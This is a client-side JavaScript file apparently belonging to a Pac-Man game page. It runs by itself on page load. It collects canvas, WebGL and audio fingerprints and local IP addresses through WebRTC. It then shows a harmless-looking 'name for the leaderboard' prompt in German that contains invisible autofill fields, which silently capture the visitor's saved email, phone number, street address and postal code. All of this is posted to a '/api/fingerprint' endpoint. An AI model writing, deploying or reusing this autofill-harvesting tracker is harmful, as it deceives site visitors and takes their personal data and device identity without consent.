(function () {
  "use strict";

  function hashString(str) {
    var hash = 2166136261;
    for (var i = 0; i < str.length; i++) {
      hash ^= str.charCodeAt(i);
      hash = Math.imul(hash, 16777619);
    }
    return (hash >>> 0).toString(16);
  }

  function getCanvasFingerprint() {
    try {
      var canvas = document.createElement("canvas");
      var ctx = canvas.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "14px Arial";
      ctx.fillStyle = "#f60";
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = "#069";
      ctx.fillText("pacman-fingerprint", 2, 15);
      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
      ctx.fillText("pacman-fingerprint", 4, 17);
      return hashString(canvas.toDataURL());
    } catch (e) {
      return null;
    }
  }

  function getWebGLInfo() {
    try {
      var canvas = document.createElement("canvas");
      var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (!gl) return { vendor: null, renderer: null };
      var dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if (!dbg) return { vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER) };
      return {
        vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
        renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL),
      };
    } catch (e) {
      return { vendor: null, renderer: null };
    }
  }

  function getAudioFingerprint(callback) {
    try {
      var AudioCtx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
      if (!AudioCtx) return callback(null);
      var ctx = new AudioCtx(1, 5000, 44100);
      var oscillator = ctx.createOscillator();
      oscillator.type = "triangle";
      oscillator.frequency.setValueAtTime(10000, ctx.currentTime);
      var compressor = ctx.createDynamicsCompressor();
      oscillator.connect(compressor);
      compressor.connect(ctx.destination);
      oscillator.start(0);
      ctx.startRendering();
      var done = false;
      ctx.oncomplete = function (e) {
        if (done) return;
        done = true;
        var output = e.renderedBuffer.getChannelData(0);
        var sum = 0;
        for (var i = 4500; i < 5000; i++) sum += Math.abs(output[i]);
        callback(sum.toString());
      };
      setTimeout(function () {
        if (!done) {
          done = true;
          callback(null);
        }
      }, 1000);
    } catch (e) {
      callback(null);
    }
  }

  function getWebRTCLocalIP(callback) {
    try {
      var RTCPeerConnection =
        window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
      if (!RTCPeerConnection) return callback(null);
      var pc = new RTCPeerConnection({ iceServers: [] });
      var ips = [];
      var done = false;
      var finish = function () {
        if (done) return;
        done = true;
        try {
          pc.close();
        } catch (e) {}
        callback(ips.length ? ips : null);
      };
      pc.createDataChannel("");
      pc.createOffer().then(function (offer) {
        return pc.setLocalDescription(offer);
      }).catch(finish);
      pc.onicecandidate = function (event) {
        if (!event || !event.candidate) {
          finish();
          return;
        }
        var match = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(
          event.candidate.candidate
        );
        if (match && ips.indexOf(match[1]) === -1) ips.push(match[1]);
      };
      setTimeout(finish, 1000);
    } catch (e) {
      callback(null);
    }
  }

  function harvestAutofill(callback) {
    try {
      var wrap = document.createElement("div");
      wrap.setAttribute(
        "style",
        "position:fixed; bottom:16px; right:16px; z-index:9999; background:#000; " +
          "border:2px solid #ffcc00; border-radius:4px; padding:10px 12px; " +
          "font-family:'Press Start 2P', monospace; font-size:11px; color:#ffcc00; " +
          "box-shadow:0 0 12px rgba(255,204,0,0.5); max-width:240px;"
      );
      wrap.innerHTML = '<div style="margin-bottom:8px; line-height:1.4;">🏆 Für die Bestenliste:<br/>Dein Name?</div>';

      var form = document.createElement("form");
      form.setAttribute("autocomplete", "on");
      form.setAttribute("style", "display:flex; gap:4px;");

      var nameInput = document.createElement("input");
      nameInput.type = "text";
      nameInput.name = "name";
      nameInput.placeholder = "Name";
      nameInput.setAttribute("autocomplete", "name");
      nameInput.setAttribute(
        "style",
        "width:110px; font-family:inherit; font-size:11px; padding:4px; " +
          "background:#111; color:#ffcc00; border:1px solid #ffcc00;"
      );

      var submitBtn = document.createElement("button");
      submitBtn.type = "submit";
      submitBtn.textContent = "OK";
      submitBtn.setAttribute(
        "style",
        "font-family:inherit; font-size:11px; padding:4px 8px; " +
          "background:#ffcc00; color:#000; border:none; cursor:pointer;"
      );

      var hiddenFields = [
        { name: "email", autocomplete: "email", type: "email" },
        { name: "tel", autocomplete: "tel", type: "tel" },
        { name: "address", autocomplete: "street-address", type: "text" },
        { name: "postal", autocomplete: "postal-code", type: "text" },
      ];
      var inputs = { name: nameInput };
      hiddenFields.forEach(function (f) {
        var input = document.createElement("input");
        input.type = f.type;
        input.name = f.name;
        input.setAttribute("autocomplete", f.autocomplete);
        input.setAttribute("style", "position:absolute; width:1px; height:1px; opacity:0; pointer-events:none;");
        inputs[f.name] = input;
        form.appendChild(input);
      });

      form.appendChild(nameInput);
      form.appendChild(submitBtn);
      wrap.appendChild(form);
      document.body.appendChild(wrap);

      var finished = false;
      var finish = function () {
        if (finished) return;
        finished = true;
        var harvested = {};
        Object.keys(inputs).forEach(function (key) {
          if (inputs[key].value) harvested[key] = inputs[key].value;
        });
        if (wrap.parentNode) document.body.removeChild(wrap);
        callback(Object.keys(harvested).length ? harvested : null);
      };

      form.addEventListener("submit", function (e) {
        e.preventDefault();
        finish();
      });

      setTimeout(finish, 15000);
    } catch (e) {
      callback(null);
    }
  }

  function collectAndSend() {
    var data = {
      timezone: (Intl.DateTimeFormat().resolvedOptions().timeZone) || null,
      screen_width: screen.width,
      screen_height: screen.height,
      color_depth: screen.colorDepth,
      pixel_ratio: window.devicePixelRatio || null,
      hardware_concurrency: navigator.hardwareConcurrency || null,
      device_memory: navigator.deviceMemory || null,
      languages: navigator.languages ? navigator.languages.join(",") : null,
      platform: navigator.platform || null,
      touch_points: navigator.maxTouchPoints || 0,
      connection_type: (navigator.connection && navigator.connection.effectiveType) || null,
      canvas_fp: getCanvasFingerprint(),
    };
    var webgl = getWebGLInfo();
    data.webgl_vendor = webgl.vendor;
    data.webgl_renderer = webgl.renderer;

    getAudioFingerprint(function (audioFp) {
      data.audio_fp = audioFp;
      getWebRTCLocalIP(function (localIps) {
        data.webrtc_local_ip = localIps ? localIps.join(",") : null;
        harvestAutofill(function (autofill) {
          if (autofill) {
            data.autofill_name = autofill.name || null;
            data.autofill_email = autofill.email || null;
            data.autofill_tel = autofill.tel || null;
            data.autofill_address = autofill.address || null;
            data.autofill_postal = autofill.postal || null;
          }
          fetch("/api/fingerprint", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data),
          }).catch(function () {});
        });
      });
    });
  }

  if (document.readyState === "complete") {
    collectAndSend();
  } else {
    window.addEventListener("load", collectAndSend);
  }
})();
